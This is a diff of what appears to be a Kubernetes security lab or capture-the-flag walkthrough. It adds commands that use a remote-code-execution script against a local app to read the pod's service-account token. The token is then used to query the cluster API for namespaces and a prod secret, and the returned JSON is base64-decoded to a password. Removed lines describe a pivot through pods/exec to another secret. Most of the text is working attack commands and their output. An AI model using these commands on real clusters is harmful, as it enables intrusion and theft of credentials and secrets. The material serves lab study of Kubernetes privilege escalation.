@@ -129,21 +129,56 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
       #   "serviceAccountName": "react2shell",
       #   "serviceAccount": "react2shell",
 
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
 
+# get cluster-secrets
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/prod/secrets/cluster-secret"
+# executable response:
+# {
+#   "kind": "Secret",
+#   "apiVersion": "v1",
+#   "metadata": {
+#     "name": "cluster-secret",
+#     "namespace": "prod",
+#     "uid": "6ef0e914-a316-4b5e-9c4f-bb5e9be14df1",
+#     "resourceVersion": "6366",
+#     "creationTimestamp": "2026-10-06T02:40:33Z",
+#     "annotations": {
+#       "argocd.argoproj.io/tracking-id": "prod:/Secret:prod/cluster-secret",
+#       "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"argocd.argoproj.io/tracking-id\":\"prod:/Secret:prod/cluster-secret\"},\"name\":\"cluster-secret\",\"namespace\":\"prod\"},\"stringData\":{\"password\":\"cLuSTer-SecReT\"},\"type\":\"Opaque\"}\n"
+#     },
+#     "managedFields": [
+#       {
+#         "manager": "argocd-controller",
+#         "operation": "Update",
+#         "apiVersion": "v1",
+#         "time": "2026-10-06T02:40:33Z",
+#         "fieldsType": "FieldsV1",
+#         "fieldsV1": {
+#           "f:data": {
+#             ".": {},
+#             "f:password": {}
+#           },
+#           "f:metadata": {
+#             "f:annotations": {
+#               ".": {},
+#               "f:argocd.argoproj.io/tracking-id": {},
+#               "f:kubectl.kubernetes.io/last-applied-configuration": {}
+#             }
+#           },
+#           "f:type": {}
+#         }
+#       }
+#     ]
+#   },
+#   "data": {
+#     "password": "Y0x1U1Rlci1TZWNSZVQ="
+#   },
+#   "type": "Opaque"
+# }
 
-# [2] frontend CANNOT read the db crown jewel directly (confinement holds)
-python scripts/rce.py http://localhost:8080 'APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS -o /dev/null -w "%{http_code}\n" --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/db/secrets/secret-cluster'
-# -> 403 Forbidden
-
-# [3] pivot: frontend RBAC allows `create pods/exec`, so exec into backend-leftover.
-#     NOTE: exec needs a SPDY/websocket upgrade -> plain curl can't do it.
-#     A real attacker drops a static kubectl (or a small ws client) into the pod.
-#     RBAC permits the exec; verify:
-kubectl auth can-i create pods/exec -n vuln --as=system:serviceaccount:vuln:frontend
-
-# [4] from inside backend-leftover, its own (cluster-wide) token reads the db secret
-kubectl -n vuln exec backend-leftover -- sh -c 'API=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${API}/api/v1/namespaces/db/secrets/secret-cluster'
-# -> 200; .data.pwd (base64) decodes to: cluster-hello-world  (CLUSTER-TIER FLAG)
+echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
+# cLuSTer-SecReT
 ```
 
 ---
